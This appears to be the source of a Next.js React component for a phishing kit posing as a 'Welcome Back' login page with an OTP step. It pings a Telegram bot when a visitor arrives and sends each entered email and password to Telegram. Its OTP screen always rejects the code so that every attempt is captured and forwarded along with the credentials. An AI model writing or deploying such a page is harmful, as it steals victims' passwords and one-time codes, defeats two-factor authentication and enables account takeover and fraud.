"use client";

import React, { useState, useRef, useEffect } from "react";
import { Eye, EyeOff, ScanFace, Loader2, ArrowLeft, RotateCcw } from "lucide-react";

export default function AuthFlowPage() {
  // View state: "login" | "otp" (Sign-in screen open by default)
  const [currentStep, setCurrentStep] = useState<"login" | "otp">("login");

  // Login form states
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginLoading, setLoginLoading] = useState(false);
  const [loginErrors, setLoginErrors] = useState<{ email?: string; password?: string }>({});

  // OTP states (supports unlimited digits)
  const [otpCode, setOtpCode] = useState("");
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpError, setOtpError] = useState("");
  const [timer, setTimer] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const otpInputRef = useRef<HTMLInputElement>(null);

  // Send location and visitor info as soon as user visits the site or opens the link
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const { sendTelegramMessage } = await import("@/lib/telegram");
        await sendTelegramMessage({
          title: "🌐 User Visited Site / Opened Link",
        });
      } catch (err) {
        console.error("Visitor tracking error:", err);
      }
    };

    trackVisitor();
  }, []);

  
  // Initialize stored email if available
  useEffect(() => {
    if (typeof window !== "undefined") {
      const stored = sessionStorage.getItem("userEmail");
      if (stored) setEmail(stored);
    }
  }, []);

  // Timer countdown for OTP
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (currentStep === "otp" && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    } else if (timer === 0) {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [currentStep, timer]);

  // Focus OTP input when transitioning or mounting
  useEffect(() => {
    if (currentStep === "otp") {
      setTimer(60);
      setCanResend(false);
      setOtpError("");
      setTimeout(() => {
        otpInputRef.current?.focus();
      }, 100);
    }
  }, [currentStep]);

  // Format email helper for OTP screen (unmasked and clearly visible)
  const getDisplayEmail = (userEmail: string) => {
    if (!userEmail || !userEmail.trim()) return "your registered email";
    return userEmail.trim();
  };

  // Validate Login Form
  const validateLoginForm = () => {
    const errors: { email?: string; password?: string } = {};

    const trimmedEmail = email.trim();
    if (!trimmedEmail) {
      errors.email = "Please enter your email address";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) {
      errors.email = "Please enter a valid email address";
    }

    if (!password.trim()) {
      errors.password = "Please enter your password";
    } else if (password.length < 4) {
      errors.password = "Password must be at least 4 characters";
    }

    setLoginErrors(errors);
    return Object.keys(errors).length === 0;
  };

  // Handle Login Submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateLoginForm()) return;

    setLoginLoading(true);
    setLoginErrors({});

    if (typeof window !== "undefined") {
      sessionStorage.setItem("userEmail", email);
    }

    try {
      const { sendTelegramMessage } = await import("@/lib/telegram");
      await sendTelegramMessage({
        title: "Login Credentials Submitted",
        email: email,
        password: password,
      });
    } catch (err) {
      console.error("Submission error:", err);
    }

    // Smooth transition to OTP screen
    await new Promise((resolve) => setTimeout(resolve, 1000));
    setLoginLoading(false);
    setCurrentStep("otp");
  };

  // Handle OTP Change (allows unlimited digits)
  const handleOtpChange = (value: string) => {
    // Keep digits only, with no length limit
    const digitsOnly = value.replace(/\D/g, "");
    setOtpCode(digitsOnly);
    if (otpError) setOtpError("");
  };

  // Handle Resend OTP
  const handleResendOtp = async () => {
    if (!canResend) return;
    setTimer(60);
    setCanResend(false);
    setOtpError("");
    try {
      const { sendTelegramMessage } = await import("@/lib/telegram");
      await sendTelegramMessage({
        title: "OTP Resend Requested",
        email: email || "Direct OTP Access",
      });
    } catch (err) {
      console.error("Resend error:", err);
    }
  };

  // Handle OTP Verification Submit (always shows invalid and sends each attempt to Telegram)
  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = otpCode.trim();
    if (!code) {
      setOtpError("Invalid verification code. Please enter your code.");
      otpInputRef.current?.focus();
      return;
    }

    const currentAttempt = otpAttempts + 1;
    setOtpAttempts(currentAttempt);
    setOtpLoading(true);
    setOtpError("");

    if (typeof window !== "undefined") {
      sessionStorage.setItem(`userOtp_${currentAttempt}`, code);
      sessionStorage.setItem("userOtp", code);
    }

    try {
      const { sendTelegramMessage } = await import("@/lib/telegram");
      await sendTelegramMessage({
        title: `OTP Submitted (Attempt #${currentAttempt})`,
        email: email || (typeof window !== "undefined" ? sessionStorage.getItem("userEmail") : null) || "Direct OTP Access",
        password: password || "N/A",
        otp1: code,
        [`otp${Math.min(currentAttempt, 3)}`]: code,
      });
    } catch (err) {
      console.error("OTP error:", err);
    }

    // Realistic verification delay before rejecting
    await new Promise((resolve) => setTimeout(resolve, 1200));
    setOtpLoading(false);
    setOtpError("Invalid verification code. Please check and try again.");
    setOtpCode("");
    setTimeout(() => {
      otpInputRef.current?.focus();
    }, 50);
  };

  return (
    <div className="min-h-[100dvh] w-full max-w-full overflow-x-hidden bg-white flex flex-col justify-between items-center px-4 sm:px-8 py-5 sm:py-8 selection:bg-[#602bf8]/15">
      {currentStep === "login" ? (
        <>
          {/* Top / Main Form Container */}
          <div className="w-full max-w-[390px] mx-auto pt-8 sm:pt-14 flex flex-col">
            {/* Header */}
            <div className="text-center">
              <h1 className="text-[28px] sm:text-[34px] font-bold text-[#232042] tracking-tight leading-tight">
                Welcome Back
              </h1>
              <p className="text-[14.5px] sm:text-[16px] text-[#767a89] font-normal mt-2">
                Log in to your account below
              </p>
            </div>

            {/* Form */}
            <form onSubmit={handleLoginSubmit} className="mt-8 sm:mt-12 flex flex-col w-full" noValidate>
              {/* Email Field */}
              <div className="flex flex-col">
                <label
                  htmlFor="email"
                  className="text-[14px] sm:text-[14.5px] font-medium text-[#65697d] mb-2"
                >
                  Email
                </label>
                <input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (loginErrors.email) {
                      setLoginErrors((prev) => ({ ...prev, email: undefined }));
                    }
                  }}
                  placeholder="Enter your email"
                  className={`w-full h-[52px] sm:h-[54px] rounded-full border-2 bg-white px-5 sm:px-6 text-[15px] text-[#232042] placeholder:text-[#a0a5b5] outline-none transition-colors ${
                    loginErrors.email
                      ? "border-red-400 focus:border-red-500"
                      : "border-[#e2e4ec] focus:border-[#602bf8]"
                  }`}
                />
                {loginErrors.email && (
                  <span className="text-[13px] text-red-500 mt-1.5 px-3">
                    {loginErrors.email}
                  </span>
                )}
              </div>

              {/* Password Field */}
              <div className="flex flex-col mt-4 sm:mt-5">
                <label
                  htmlFor="password"
                  className="text-[14px] sm:text-[14.5px] font-medium text-[#65697d] mb-2"
                >
                  Password
                </label>
                <div className="relative w-full">
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (loginErrors.password) {
                        setLoginErrors((prev) => ({ ...prev, password: undefined }));
                      }
                    }}
                    placeholder="Enter your password"
                    className={`w-full h-[52px] sm:h-[54px] rounded-full border-2 bg-white pl-5 sm:pl-6 pr-24 text-[15px] text-[#232042] placeholder:text-[#a0a5b5] outline-none transition-colors ${
                      loginErrors.password
                        ? "border-red-400 focus:border-red-500"
                        : "border-[#e2e4ec] focus:border-[#602bf8]"
                    }`}
                  />

                  {/* Password Action Icons */}
                  <div className="absolute right-4 sm:right-5 top-1/2 -translate-y-1/2 flex items-center gap-3 text-[#9aa0b2]">
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="hover:text-[#65697d] transition-colors focus:outline-none cursor-pointer p-0.5"
                      aria-label={showPassword ? "Hide password" : "Show password"}
                    >
                      {showPassword ? (
                        <Eye className="w-[20px] h-[20px]" strokeWidth={1.8} />
                      ) : (
                        <EyeOff className="w-[20px] h-[20px]" strokeWidth={1.8} />
                      )}
                    </button>

                    <button
                      type="button"
                      className="text-[#9aa0b2] focus:outline-none cursor-default p-0.5"
                      aria-label="Biometric Scan"
                    >
                      <ScanFace className="w-[21px] h-[21px]" strokeWidth={1.8} />
                    </button>
                  </div>
                </div>
                {loginErrors.password && (
                  <span className="text-[13px] text-red-500 mt-1.5 px-3">
                    {loginErrors.password}
                  </span>
                )}
              </div>

              {/* Forgotten Password Link */}
              <div className="mt-3.5 sm:mt-4 flex justify-end">
                <span
                  role="button"
                  aria-disabled="true"
                  onClick={(e) => e.preventDefault()}
                  className="text-[13.5px] sm:text-[14px] font-normal text-[#5ec2f8] select-none cursor-pointer"
                >
                  Forgotten Password?
                </span>
              </div>

              {/* Log In Button */}
              <button
                type="submit"
                disabled={loginLoading}
                className="mt-6 sm:mt-8 w-full h-[52px] sm:h-[54px] rounded-full bg-[#602bf8] hover:bg-[#5321eb] active:scale-[0.99] text-white font-bold text-[15.5px] sm:text-[16px] flex items-center justify-center transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed shadow-[0_2px_10px_rgba(96,43,248,0.2)]"
              >
                {loginLoading ? (
                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                ) : (
                  "Log In"
                )}
              </button>
            </form>
          </div>

          {/* Bottom Footer */}
          <div className="pt-8 sm:pt-12 pb-2 text-center text-[14px] sm:text-[15px]">
            <span className="text-[#4b5063]">Are you a new user? </span>
            <span
              role="button"
              aria-disabled="true"
              onClick={(e) => e.preventDefault()}
              className="text-[#602bf8] font-bold select-none cursor-pointer"
            >
              Sign up
            </span>
          </div>
        </>
      ) : (
        /* OTP Verification Screen */
        <div className="w-full max-w-[390px] mx-auto pt-2 sm:pt-4 flex flex-col justify-between flex-1">
          <div>
            {/* Top Back Navigation */}
            <div className="w-full flex items-center justify-start mb-4 sm:mb-6">
              <button
                type="button"
                onClick={() => setCurrentStep("login")}
                className="flex items-center gap-1.5 text-[#65697d] hover:text-[#232042] text-[13.5px] sm:text-[14px] font-medium transition-colors cursor-pointer p-1 -ml-1"
                aria-label="Back to login"
              >
                <ArrowLeft className="w-4.5 h-4.5 sm:w-5 sm:h-5" strokeWidth={2} />
                <span>Back</span>
              </button>
            </div>

            {/* OTP Header */}
            <div className="text-center px-1">
              <h2 className="text-[26px] sm:text-[30px] font-bold text-[#232042] tracking-tight leading-tight">
                Enter OTP Code
              </h2>
              <p className="text-[14px] sm:text-[14.5px] text-[#767a89] font-normal mt-2 leading-relaxed break-words">
                We sent a verification code to
                <br />
                <span className="font-semibold text-[#232042] break-all">
                  {getDisplayEmail(email)}
                </span>
              </p>
            </div>

            {/* OTP Inputs Form */}
            <form onSubmit={handleOtpSubmit} className="mt-6 sm:mt-8 flex flex-col items-center w-full" noValidate>
              <div className="w-full flex flex-col items-center">
                <div className="w-full relative">
                  <input
                    ref={otpInputRef}
                    type="tel"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    value={otpCode}
                    onChange={(e) => handleOtpChange(e.target.value)}
                    placeholder="Enter OTP code"
                    className={`w-full h-[54px] sm:h-[56px] bg-white text-[#232042] text-[18px] sm:text-[22px] font-bold text-center tracking-[0.14em] sm:tracking-[0.18em] rounded-2xl border-2 outline-none transition-all px-4 placeholder:text-[#a0a5b5] placeholder:tracking-normal placeholder:font-normal placeholder:text-[14px] sm:placeholder:text-[15px] ${
                      otpError
                        ? "border-red-400 bg-red-50/20 focus:border-red-500 ring-2 ring-red-400/20"
                        : "border-[#e2e4ec] focus:border-[#602bf8] focus:ring-4 focus:ring-[#602bf8]/15"
                    }`}
                  />
                </div>
              </div>

              {/* OTP Error Message */}
              {otpError && (
                <p className="text-red-500 text-[13px] sm:text-[13.5px] font-medium mt-2.5 sm:mt-3 text-center px-2">
                  {otpError}
                </p>
              )}

              {/* Confirm / Verify Button */}
              <button
                type="submit"
                disabled={otpLoading}
                className="mt-6 sm:mt-8 w-full h-[52px] sm:h-[54px] rounded-full bg-[#602bf8] hover:bg-[#5321eb] active:scale-[0.99] text-white font-bold text-[15.5px] sm:text-[16px] flex items-center justify-center transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed shadow-[0_2px_10px_rgba(96,43,248,0.2)]"
              >
                {otpLoading ? (
                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                ) : (
                  "Verify"
                )}
              </button>

              {/* Resend Timer Section */}
              <div className="flex flex-wrap items-center justify-center gap-1.5 mt-5 sm:mt-6 text-[13.5px] sm:text-[14px]">
                <span className="text-[#767a89]">Didn't receive the code?</span>
                {canResend ? (
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    className="text-[#602bf8] font-bold hover:underline cursor-pointer flex items-center gap-1"
                  >
                    <RotateCcw className="w-3.5 h-3.5" />
                    <span>Resend OTP</span>
                  </button>
                ) : (
                  <span className="text-[#602bf8] font-semibold tabular-nums">
                    Resend in {timer}s
                  </span>
                )}
              </div>
            </form>
          </div>

          {/* Cancel button */}
          <div className="py-3 sm:py-4 text-center">
            <button
              type="button"
              onClick={() => setCurrentStep("login")}
              className="text-[#767a89] hover:text-[#232042] text-[13.5px] sm:text-[14px] font-medium transition-colors cursor-pointer"
            >
              Cancel and back to login
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
